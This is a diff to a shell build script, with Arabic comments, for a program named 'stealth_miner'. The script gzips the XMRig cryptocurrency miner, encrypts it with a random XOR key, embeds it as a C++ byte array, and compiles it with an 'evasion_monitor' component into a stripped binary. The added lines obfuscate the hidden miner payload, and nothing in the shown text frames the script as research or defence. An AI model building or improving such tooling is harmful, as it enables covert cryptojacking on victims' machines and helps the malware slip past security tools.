@@ -50,15 +50,25 @@ cd output
 
 echo ""
 echo "🔄 Step 1: Converting XMRig to C++ array..."
+## توليد مفتاح XOR عشوائي وضغط البلايناري
+head -c 16 /dev/urandom > xor_key.bin
+gzip -c ../xmrig > xmrig.gz
 
-# تحويل XMRig إلى hex array
+## تضمين البيانات المشفرة والمفتاح
 echo '#include "binary_embedder.h"' > embedded_data.cpp
 echo '' >> embedded_data.cpp
-echo '// XMRig binary embedded as byte array' >> embedded_data.cpp
-echo 'const unsigned char embedded_xmrig[] = {' >> embedded_data.cpp
+echo '// XMRig binary embedded as compressed+XOR encrypted byte array' >> embedded_data.cpp
+echo 'const unsigned char embedded_xmrig_encrypted[] = {' >> embedded_data.cpp
+xxd -i < xmrig.gz | sed 's/^/    /' | sed 's/$/,/' | sed '$ s/,$//' >> embedded_data.cpp
+echo '};' >> embedded_data.cpp
+echo 'const size_t embedded_xmrig_encrypted_size = sizeof(embedded_xmrig_encrypted);' >> embedded_data.cpp
 
-# تحويل الملف الثنائي إلى hex مع تنسيق جميل
-xxd -i < ../xmrig | sed 's/^/    /' | sed 's/$/,/' | sed '$ s/,$//' >> embedded_data.cpp
+echo '' >> embedded_data.cpp
+echo '// XOR decryption key' >> embedded_data.cpp
+echo 'const unsigned char xor_key[] = {' >> embedded_data.cpp
+xxd -i < xor_key.bin | sed 's/^/    /' | sed 's/$/,/' | sed '$ s/,$//' >> embedded_data.cpp
+echo '};' >> embedded_data.cpp
+echo 'const size_t xor_key_size = sizeof(xor_key);' >> embedded_data.cpp
 
 echo '};' >> embedded_data.cpp
 echo '' >> embedded_data.cpp
@@ -97,14 +107,15 @@ echo ""
 echo "🔄 Step 4: Compiling stealth miner..."
 
 # بناء المشروع
-g++ -o stealth_miner \
+g++ -D_GNU_SOURCE -fPIE -pie -fstack-protector-strong -Wl,-z,relro,-z,now -Wl,-z,noexecstack -o stealth_miner \
     main.cpp \
     evasion_monitor.cpp \
     binary_embedder.cpp \
     -pthread \
     -std=c++11 \
     -O2 \
-    -s
+    -s \
+    -lz
 
 if [[ $? -eq 0 ]]; then
     echo "✅ Compilation successful!"
